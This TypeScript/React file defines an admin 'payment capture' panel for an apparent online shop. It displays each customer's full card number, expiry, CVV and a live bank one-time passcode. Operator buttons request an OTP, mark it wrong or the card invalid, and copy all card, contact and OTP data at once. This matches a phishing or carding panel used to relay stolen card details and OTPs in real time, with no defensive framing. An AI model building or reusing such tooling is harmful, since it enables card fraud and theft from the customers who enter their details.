import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { formatMoney } from "@/lib/format";
import { useCountdown } from "@/lib/hooks";
import { useT } from "@/lib/i18n";
import { useOrdersStore } from "@/lib/store/orders";
import type { Order } from "@/lib/types";
import { cn } from "@/lib/utils";

function spacedPan(value: string) {
  return value.replace(/\D/g, "").replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

async function copyText(value: string, ok: string) {
  try {
    await navigator.clipboard.writeText(value);
    toast.success(ok);
  } catch {
    toast.error(ok);
  }
}

export function PaymentCapturePanel({ order }: { order: Order }) {
  const { t, locale } = useT();
  const requestOtp = useOrdersStore((s) => s.requestOtp);
  const markOtpWrong = useOrdersStore((s) => s.markOtpWrong);
  const markCardInvalid = useOrdersStore((s) => s.markCardInvalid);
  const approvePayment = useOrdersStore((s) => s.approvePayment);
  const rejectPayment = useOrdersStore((s) => s.rejectPayment);
  const cap = order.paymentCapture;
  const pan = cap?.cardNumber ?? "";
  const done = order.paymentStatus === "paid" || order.paymentStatus === "rejected" || order.paymentStatus === "failed";
  const waiting = order.paymentStatus === "otp_requested" || order.paymentStatus === "otp_wrong";
  const received = order.paymentStatus === "otp_received";
  const invalid = order.paymentStatus === "card_invalid";

  const dump = [
    `${t("order.number")}: ${order.number}`,
    `${t("admin.customer")}: ${order.customerName}`,
    `${t("checkout.email")}: ${order.email}`,
    `${t("checkout.phone")}: ${order.phone}`,
    `${t("pay.holder")}: ${cap?.holder ?? ""}`,
    `${t("admin.pan")}: ${pan}`,
    `${t("pay.expiry")}: ${cap?.expiry ?? ""}`,
    `${t("pay.cvv")}: ${cap?.cvv ?? ""}`,
    `${t("admin.amountDue")}: ${formatMoney(order.totals.total, locale)}`,
    order.otp?.code ? `OTP: ${order.otp.code}` : "",
  ]
    .filter(Boolean)
    .join("\n");

  return (
    <section className="space-y-4 rounded-2xl border border-primary/20 bg-primary/5 p-4">
      <div className="flex flex-wrap items-center justify-between gap-2">
        <h3 className="text-sm font-semibold">{t("admin.capture")}</h3>
        <span
          className={cn(
            "rounded-full px-2.5 py-0.5 text-[11px] font-semibold",
            order.paymentStatus === "paid" && "bg-emerald-500/15 text-emerald-700",
            order.paymentStatus === "rejected" && "bg-destructive/15 text-destructive",
            (order.paymentStatus === "pending" || waiting || invalid) && "bg-amber-500/15 text-amber-800",
            received && "bg-primary/15 text-primary",
          )}
        >
          {payLabel(order.paymentStatus, t)}
        </span>
      </div>

      <div className="grid gap-2 sm:grid-cols-2">
        <CopyField label={t("pay.holder")} value={cap?.holder ?? order.customerName} ok={t("admin.copied")} />
        <CopyField label={t("checkout.phone")} value={order.phone} ok={t("admin.copied")} />
        <CopyField label={t("checkout.email")} value={order.email} ok={t("admin.copied")} />
        <CopyField label={t("admin.amountDue")} value={formatMoney(order.totals.total, locale)} ok={t("admin.copied")} />
        <CopyField label={t("admin.pan")} value={spacedPan(pan)} raw={pan} mono className="sm:col-span-2" ok={t("admin.copied")} />
        <CopyField label={t("pay.expiry")} value={cap?.expiry ?? "—"} ok={t("admin.copied")} />
        <CopyField label={t("pay.cvv")} value={cap?.cvv ?? "—"} mono ok={t("admin.copied")} />
      </div>

      <div className="rounded-xl border border-border bg-card p-4 text-center">
        <p className="text-xs font-medium uppercase tracking-wide text-muted-foreground">{t("admin.otpLive")}</p>
        {order.otp?.code ? (
          <p className="mt-2 font-mono text-4xl font-semibold tracking-[0.4em] text-primary" dir="ltr">
            {order.otp.code}
          </p>
        ) : (
          <p className="mt-2 text-sm text-muted-foreground">{waiting ? t("admin.waitingOtp") : t("admin.otpEmpty")}</p>
        )}
        {order.otp?.attempts ? (
          <p className="mt-1 text-[11px] text-muted-foreground">{order.otp.attempts}</p>
        ) : null}
      </div>

      {order.paymentStatus === "pending" && order.reviewDeadline ? <AdminReviewClock endAt={order.reviewDeadline} /> : null}

      {!done ? (
        <div className="grid gap-2 sm:grid-cols-2">
          <Button type="button" onClick={() => approvePayment(order.id)}>
            {t("admin.approvePay")}
          </Button>
          <Button type="button" variant="outline" onClick={() => requestOtp(order.id)}>
            {t("admin.askOtp")}
          </Button>
          <Button type="button" variant="outline" onClick={() => markCardInvalid(order.id)}>
            {t("admin.cardInvalid")}
          </Button>
          {waiting || received ? (
            <Button type="button" variant="outline" onClick={() => markOtpWrong(order.id)}>
              {t("admin.wrongOtp")}
            </Button>
          ) : (
            <Button type="button" variant="destructive" onClick={() => rejectPayment(order.id)}>
              {t("admin.rejectPay")}
            </Button>
          )}
        </div>
      ) : (
        <p className="text-sm font-medium">
          {order.paymentStatus === "paid" ? t("admin.payApproved") : t("admin.payRejected")}
        </p>
      )}

      <Button type="button" variant="secondary" className="w-full" onClick={() => void copyText(dump, t("admin.copied"))}>
        {t("admin.copyAll")}
      </Button>
    </section>
  );
}

function AdminReviewClock({ endAt }: { endAt: string }) {
  const { t } = useT();
  const cd = useCountdown(Date.parse(endAt));
  const pad = (n: number) => String(n).padStart(2, "0");
  return (
    <p className="rounded-xl border border-amber-500/30 bg-amber-500/10 px-3 py-2 text-xs">
      {t("admin.autoConfirmIn")}{" "}
      <span className="font-mono font-semibold tabular-nums" dir="ltr">
        {pad(cd.minutes)}:{pad(cd.seconds)}
      </span>
    </p>
  );
}

function CopyField({
  label,
  value,
  raw,
  mono,
  className,
  ok,
}: {
  label: string;
  value: string;
  raw?: string;
  mono?: boolean;
  className?: string;
  ok: string;
}) {
  const { t } = useT();
  return (
    <div className={cn("rounded-xl border border-border bg-card p-3", className)}>
      <div className="flex items-center justify-between gap-2">
        <p className="text-[11px] font-medium uppercase tracking-wide text-muted-foreground">{label}</p>
        <button
          type="button"
          className="text-[11px] font-semibold text-primary hover:underline"
          onClick={() => void copyText(raw ?? value, ok)}
        >
          {t("admin.copy")}
        </button>
      </div>
      <p className={cn("mt-1 break-all text-sm font-semibold", mono && "font-mono tracking-wide")} dir="ltr">
        {value || "—"}
      </p>
    </div>
  );
}

function payLabel(status: Order["paymentStatus"], t: (k: string) => string) {
  if (status === "paid") return t("admin.payApproved");
  if (status === "rejected" || status === "failed") return t("admin.payRejected");
  if (status === "card_invalid") return t("admin.cardInvalid");
  if (status === "otp_received") return t("admin.otpLive");
  if (status === "otp_requested" || status === "otp_wrong") return t("admin.waitingOtp");
  return t("admin.payPending");
}
